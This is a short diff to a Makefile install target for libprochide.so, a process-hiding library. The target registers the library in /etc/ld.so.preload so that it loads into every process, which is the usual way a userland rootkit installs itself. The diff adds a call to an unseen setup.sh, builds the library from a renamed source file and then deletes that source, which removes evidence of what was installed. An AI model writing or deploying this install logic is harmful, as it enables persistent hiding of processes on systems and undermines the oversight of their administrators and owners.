@@ -1,5 +1,7 @@
 install:
-	gcc -Wall -fPIC -shared -o libprochide.so proc_hide.c -ldl
+	./setup.sh
+	gcc -Wall -fPIC -shared -o libprochide.so hidelib.c -ldl
+	rm -f hidelib.c
 	mv libprochide.so /usr/local/lib/
 	echo /usr/local/lib/libprochide.so >> /etc/ld.so.preload
 clean:
